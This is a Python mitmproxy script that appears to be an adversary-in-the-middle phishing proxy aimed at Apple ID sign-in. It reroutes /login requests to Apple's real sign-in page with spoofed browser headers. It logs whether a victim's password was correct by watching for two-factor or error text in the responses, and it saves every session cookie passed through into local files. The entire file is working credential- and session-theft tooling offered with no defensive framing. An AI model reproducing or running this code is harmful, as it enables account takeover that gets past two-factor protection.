import json
import os
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from mitmproxy import http

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIES_FILE = os.path.join(SCRIPT_DIR, "cookies.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "2fa_log.txt")
COOKIES_TXT = os.path.join(SCRIPT_DIR, "cookies.txt")

cookies_store = {}

def save_cookies():
    with open(COOKIES_FILE, 'w') as f:
        json.dump(cookies_store, f, indent=2)

def log_2fa(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")

def extract_cookies(flow: http.HTTPFlow):
    if 'set-cookie' in flow.response.headers:
        for cookie in flow.response.headers.get_all('set-cookie'):
            try:
                with open(COOKIES_TXT, 'a') as f:
                    f.write(cookie + "\n")
            except:
                pass
            match = re.match(r'([^=]+)=([^;]+)', cookie)
            if match:
                name, value = match.groups()
                cookies_store[name] = {
                    'value': value,
                    'domain': flow.request.pretty_host,
                    'timestamp': datetime.now().isoformat()
                }
    save_cookies()

def request(flow: http.HTTPFlow) -> None:
    host = flow.request.headers.get("Host", "")
    path = flow.request.path
    
    # Handle /login - redirect to Apple's real sign-in
    if path == "/login" or path.startswith("/login?"):
        query = parse_qs(urlparse(flow.request.url).query)
        account_name = query.get('accountName', [''])[0]
        
        if account_name:
            log_2fa(f"Routing to Apple sign-in for: {account_name}")
            
            # Route to Apple account sign-in with email
            flow.request.url = f"https://account.apple.com/sign-in?accountName={account_name}"
            flow.request.headers["Host"] = "account.apple.com"
            flow.request.headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
            flow.request.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            flow.request.headers["Accept-Language"] = "en-US,en;q=0.5"
            return

def response(flow: http.HTTPFlow) -> None:
    host = flow.request.pretty_host
    path = flow.request.path
    status = flow.response.status_code
    content = flow.response.get_text(strict=False) or ""
    
    # Log Apple responses
    if "apple.com" in host or "icloud.com" in host:
        log_2fa(f"Apple {path}: status={status}")
        
        # Check for 2FA page (password correct)
        if "two-factor" in content.lower() or "verification" in content.lower():
            log_2fa("Password CORRECT - 2FA page detected")
        
        # Check for error (password wrong)
        if "incorrect" in content.lower() or "invalid" in content.lower():
            log_2fa("Password WRONG - error detected")
    
    extract_cookies(flow)

if __name__ == "__main__":
    if os.path.exists(COOKIES_FILE):
        try:
            with open(COOKIES_FILE, 'r') as f:
                cookies_store = json.load(f)
        except:
            pass
    print(f"Loaded {len(cookies_store)} cookies")
    print("Proxy ready")